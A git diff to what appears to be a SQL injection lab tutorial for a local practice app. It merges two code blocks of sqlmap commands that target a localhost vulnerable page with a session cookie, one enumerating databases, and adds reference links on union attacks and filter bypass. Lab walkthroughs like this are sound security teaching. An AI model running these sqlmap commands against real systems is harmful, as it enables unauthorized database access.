@@ -227,10 +227,9 @@ docker ps
 #### 2.3.2 Exploit the Vulnerability with SQL Map
 
 ```bash
+# General exploit with SQL Map
 sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookies=" PHPSESSID=1d0b0b0b0b0b0b0b0b0b0b0b0b0b0b0b; security=low"
-```
 
-```bash
 # Getting the databases
 sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit#" --batch --cookies=" PHPSESSID=1d0b0b0b0b0b0b0b0b0b0b0b0b0b0b0b; security=low" --dbs
 
@@ -280,5 +279,7 @@ sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookies
 - [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
 - [SQL Map Docs](https://github.com/sqlmapproject/sqlmap)
 - [SQL Injection Cheat Sheet](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)
+- [Union Attack](https://portswigger.net/web-security/sql-injection/union-attacks)
+- [SQL Injection Bypassing Common Filters](https://portswigger.net/support/sql-injection-bypassing-common-filters)
 
 # Made with 💚 by Khaders
